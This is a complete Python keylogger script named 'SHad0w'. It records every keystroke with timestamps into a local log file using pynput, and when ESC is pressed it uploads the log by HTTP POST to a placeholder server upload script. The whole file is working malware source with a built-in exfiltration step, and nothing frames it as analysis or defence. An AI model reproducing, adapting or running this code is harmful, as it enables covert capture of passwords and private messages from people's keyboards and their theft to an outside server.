#!/usr/bin/env python3

import os
from datetime import datetime
from pynput import keyboard
import requests
import subprocess
import pyfiglet

# Function to print a fancy title
def print_title():
    ascii_art = pyfiglet.figlet_format("SHad0w")
    print(ascii_art)

# Function to upload the log file to the server
def upload_log_file(file_path):
    url = 'http://<server-IP>/upload.php'  # Change this URL to your actual upload script path
    files = {'file': open(file_path, 'rb')}
    response = requests.post(url, files=files)
    if response.status_code == 200:
        print("Log file uploaded successfully.")
    else:
        print(f"Failed to upload log file. Status code: {response.status_code}")

def main():

    print_title()
    # Check if the required libraries are installed
    try:
        import pynput
        import requests
    except ImportError:
        print("Required libraries not found. Running installation script...")
        subprocess.call(['bash', 'install_requirements.sh'])
        return

    # Specify the name of the log file based on current date and time
    log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y_%H-%M-%S")}.log'

    current_word = []

    # The logging function to write the key press event to a file
    def on_press(key):
        nonlocal current_word
        with open(log_file, "a") as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            try:
                if key.char:
                    current_word.append(key.char)
            except AttributeError:
                if key == keyboard.Key.enter:
                    if current_word:
                        f.write(f"{timestamp} - {''.join(current_word)}\n")
                        current_word = []
                    f.write(f"{timestamp} - <ENTER>\n")
                elif key == keyboard.Key.space:
                    if current_word:
                        f.write(f"{timestamp} - {''.join(current_word)}\n")
                        current_word = []
                    f.write(f"{timestamp} - <SPACE>\n")
                elif key == keyboard.Key.backspace:
                    f.write(f"{timestamp} - <BACKSPACE>\n")
                    if current_word:
                        current_word.pop()
                elif key == keyboard.Key.tab:
                    if current_word:
                        f.write(f"{timestamp} - {''.join(current_word)}\n")
                        current_word = []
                    f.write(f"{timestamp} - <TAB>\n")
                elif key == keyboard.Key.esc:
                    if current_word:
                        f.write(f"{timestamp} - {''.join(current_word)}\n")
                    f.write(f"{timestamp} - <ESC>\n")
                    # Upload the log file and stop the listener
                    upload_log_file(log_file)
                    return False  # This should stop the listener
                else:
                    f.write(f"{timestamp} - <{key.name.upper()}>\n")

    # Set up the listener to monitor key presses and releases
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
